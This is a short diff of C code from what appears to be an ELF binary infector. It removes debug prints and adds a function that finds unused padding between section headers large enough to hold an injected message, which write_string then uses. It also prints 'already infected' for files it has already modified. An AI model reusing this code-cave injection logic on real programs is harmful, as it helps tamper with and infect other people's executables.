@@ -18,26 +18,15 @@ Elf64_Off	PaddingFinder_shdr(void *ptr)
 	Elf64_Off previous = 0;
 	Elf64_Off current = 0;
 	int i;
-	printf("----------------------------------------------------\n");
 	for (i = 1 ; i < shnum ; ++i)
 	{
 		previous = shdr[i - 1].sh_offset + shdr[i - 1].sh_size;
 		current = shdr[i].sh_offset;
-		printf("previous : [%x] | current : [%x]\n", previous, current);
-		printf("gap : {%d}\n", current - previous);
+		if (!previous|| previous > current)
+			continue;
+		if ((current - previous) > strlen(message))
+			return (previous);
 	}
-	printf("----------------------------------------------------\n");
-	u_int16_t	phnum 		= ehdr->e_phnum;
-	Elf64_Phdr *phdr = (Elf64_Phdr *)(ptr + ehdr->e_phoff);
-	for (i = 1 ; i < phnum ; ++i)
-	{
-		previous = phdr[i - 1].p_offset + phdr[i - 1].p_filesz;
-		current = phdr[i].p_offset;
-		printf("previous : [%x] | current : [%x]\n", previous, current);
-		printf("gap : {%d}\n", current - previous);
-	}
-	printf("----------------------------------------------------\n");
-	printf("----------------------------------------------------\n");
 	return 0;
 }
 
@@ -101,8 +90,8 @@ int			write_string(char *ptr, off_t size, char *filename, int fd)
 			fprintf(stderr, BOLDRED"<"CYAN"o"RED">"RESET CYAN"%s"YELLOW" already infected\n", filename);
 		return (0);
 	}
-	// PaddingFinder_shdr(ptr);
-	Elf64_Off	endSegment = PaddingFinder(ptr);
+	// PaddingFinder(ptr);
+	Elf64_Off	endSegment = PaddingFinder_shdr(ptr);
 	if (visual)
 		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" stuff in ["RED"%x"YELLOW"]\n"RESET, endSegment);
 	if (endSegment)
